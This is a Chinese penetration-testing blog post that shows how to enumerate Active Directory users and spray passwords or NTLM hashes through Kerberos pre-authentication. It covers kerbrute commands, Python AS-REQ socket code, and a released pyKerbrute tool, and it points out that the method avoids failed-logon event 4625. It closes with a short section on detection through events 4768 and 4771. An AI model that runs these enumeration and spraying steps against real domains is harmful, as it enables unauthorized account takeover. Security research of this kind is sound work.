---
layout: post
title: 渗透技巧——通过Kerberos pre-auth进行用户枚举和口令爆破
---


## 0x00 前言
---

在之前的文章[《渗透基础——通过LDAP协议暴力破解域用户的口令》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E9%80%9A%E8%BF%87LDAP%E5%8D%8F%E8%AE%AE%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%9F%9F%E7%94%A8%E6%88%B7%E7%9A%84%E5%8F%A3%E4%BB%A4/)介绍了通过LDAP协议暴力破解域用户口令的方法，最大的特点是会产生日志(4625 - An account failed to log on)

而使用[kerbrute](https://github.com/ropnop/kerbrute)通过Kerberos pre-auth进行暴力破解时不会产生日志(4625 - An account failed to log on)，于是我对[kerbrute](https://github.com/ropnop/kerbrute)做了进一步的研究，使用python实现了相同的功能，并且添加支持TCP协议和NTLM hash的验证。本文将要记录自己的研究过程和学习心得。

## 0x01 简介
---

- kerbrute的介绍
- kerbrute的原理
- 使用python实现kerbrute的细节
- 开源代码pyKerbrute
- Kerberos pre-auth bruteforcing的检测

## 0x02 kerbrute的适用场景
---

适用场景:从域外对域用户进行用户枚举和口令暴力破解

由于没有域用户的口令，所以无法通过LDAP协议枚举出所有域用户，而且使用LDAP协议进行暴力破解时会产生日志(4625 - An account failed to log on)

使用kerbrute有如下优点：

- 使用Kerberos pre-auth bruteforcing的速度更快
- 不会产生日志(4625 - An account failed to log on)

**注：**

Kerberos pre-auth对应的端口默认为88

## 0x03 kerbrute测试
---

测试环境如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-12/3-1.png)

kerbrute使用Go语言开发，github提供了编译好的文件，地址如下：

https://github.com/ropnop/kerbrute/releases

kerbrute主要包括以下两个功能：

### 1.用户枚举

用来验证用户是否存在，命令如下：

```
kerbrute_windows_amd64.exe userenum --dc 192.168.1.1 -d test.com user.txt
```

测试结果如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-1-1/2-1.png)

适用场景:

不掌握域用户的口令，所以无法通过LDAP协议枚举出所有域用户，可以使用这种方式来验证用户是否存在

### 2.口令验证

在确定了用户存在以后，可以使用这个功能来验证口令是否正确，命令如下：

```
kerbrute_windows_amd64.exe passwordspray -d test.com user.txt DomainUser123!
```

测试结果如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-1-1/2-2.png)

如果登录成功，会产生日志(4768 - A Kerberos authentication ticket (TGT) was requested)，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-1-1/2-3.png)

## 0x04 使用python实现kerbrute的细节
---

我的想法是实现kerbrute的两个主要功能：用户枚举和口令验证

通过python实现kerberos协议的部分我参考了[pykek](https://github.com/mubix/pykek)

接下来通过抓包的方式获得kerbrute的数据包内容，然后通过python构造相同的数据包

kerbrute使用UDP协议实现Kerberos pre-auth，用来对明文口令进行验证

我在研究的过程中，发现通过TCP协议也能实现相同的功能，而且能够对NTLM hash进行验证

### 1.使用python实现用户枚举

使用wireshark抓取kerbrute用户枚举功能产生的数据包

使用UDP协议，用户枚举时发送的数据包内容如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-1-1/3-1.png)

如果用户存在，返回的数据包内容如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-1-1/3-2.png)

判断标志：`error-code: eRR-PREAUTH-REQUIRED (25)`

如果用户不存在，返回的数据包内容如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-1-1/3-3.png)

判断标志：`error-code: eRR-C-PRINCIPAL-UNKNOWN (6)`

接下来就是使用python实现发送UDP数据，发送的内容同kerbrute用户枚举时的数据包相同；接收返回内容，通过标志位来判断用户是否存在

通过TCP协议也能实现相同的功能，只是数据包格式不一样

TCP数据包前面要加一段字符串`pack('>I', len(data))`

具体的代码如下：

TCP：

```
def send_req_tcp(req, kdc, port=88):
    data = encode(req)
    data = pack('>I', len(data)) + data
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((kdc, port))
    sock.send(data)
    return sock

def recv_rep_tcp(sock):
    data = ''
    datalen = None
    while True:
        rep = sock.recv(8192)
        if not rep:
            sock.close()
            raise IOError('Connection error')
        data += rep
        if len(rep) >= 4:
            if datalen is None:
                datalen = unpack('>I', rep[:4])[0]
            if len(data) >= 4 + datalen:
                sock.close()
                return data[4:4 + datalen]
```

UDP：

```
def send_req_udp(req, kdc, port=88):
    data = encode(req)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect((kdc, port))
    sock.send(data)
    return sock

def recv_rep_udp(sock):
    data = ''
    datalen = None
    while True:
        rep = sock.recv(8192)
        if not rep:
            sock.close()
            raise IOError('Connection error')
        data += rep
        if len(rep) >= 4:
            sock.close()
            return data
```

### 2.使用python实现口令验证

使用wireshark抓取kerbrute口令验证功能产生的数据包

使用UDP协议，口令验证时发送的数据包内容如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-1-1/3-4.png)

相比用户枚举，在口令验证时多了一部分内容(padata)

具体差异如下：

用户枚举发送的数据包格式如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-1-1/3-5.png)

口令验证发送的数据包格式如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-1-1/3-6.png)

所以在实现上需要添加padata段的内容

如果口令正确，返回的数据包内容如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-1-1/3-7.png)

如果口令错误，返回的数据包内容如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-1-1/3-8.png)

具体的数据包结构可以参考RFC文档，地址如下：

https://tools.ietf.org/html/rfc1510#page-50

计算padata-value需要先将明文口令转换成NTLM hash再进行计算

所以说这个位置不仅可以使用明文口令，也可以使用NTLM hash

部分加密的python代码如下：

使用明文口令：

```
clearpassword = DomainUser123!
user_key = (RC4_HMAC, ntlm_hash(clearpassword).digest())
pa_ts = build_pa_enc_timestamp(current_time, user_key)
as_req['padata'][0]['padata-value'] = encode(pa_ts)
```

使用NTLM hash：

```
ntlmhash = e00045bd566a1b74386f5c1e3612921b
user_key = (RC4_HMAC, ntlmhash.decode('hex'))
pa_ts = build_pa_enc_timestamp(current_time, user_key)
as_req['padata'][0]['padata-value'] = encode(pa_ts)
```


## 0x05 开源代码pyKerbrute
---

完整的实现代码已上传至github，地址如下：

https://github.com/3gstudent/pyKerbrute


pyKerbrute是对kerbrute的python实现，相比于kerbrute，多了以下两个功能：

- 增加对TCP协议的支持
- 增加对NTLM hash的验证

pyKerbrute分为用户枚举和口令验证两个功能

### 1.EnumADUser.py

用户枚举功能，支持TCP和UDP协议

命令实例：

```
EnumADUser.py 192.168.1.1 test.com user.txt tcp
```

结果输出如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-1-1/4-1.png)

### 2.ADPwdSpray.py

口令验证功能，支持TCP和UDP协议，支持明文口令和NTLM hash

命令实例1：

```
ADPwdSpray.py 192.168.1.1 test.com user.txt clearpassword DomainUser123! tcp
```

结果输出如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-1-1/4-2.png)

命令实例2：

```
ADPwdSpray.py 192.168.1.1 test.com user.txt ntlmhash e00045bd566a1b74386f5c1e3612921b udp
```

结果输出如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-1-1/4-3.png)

## 0x06 Kerberos pre-auth bruteforcing的检测
---

Kerbrute使用Kerberos pre-auth协议，不会产生日志(4625 - An account failed to log on)

但是会产生以下日志：

- 口令验证成功时产生日志(4768 - A Kerberos authentication ticket (TGT) was requested)
- 口令验证失败时产生日志(4771 - Kerberos pre-authentication failed)

## 0x07 小结
---

本文对kerbrute进行了测试分析，使用python实现了相同的功能，并且添加支持TCP协议和NTLM hash的验证，开源代码，介绍脚本编写的细节，给出Kerberos pre-auth bruteforcing的检测方法。


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)





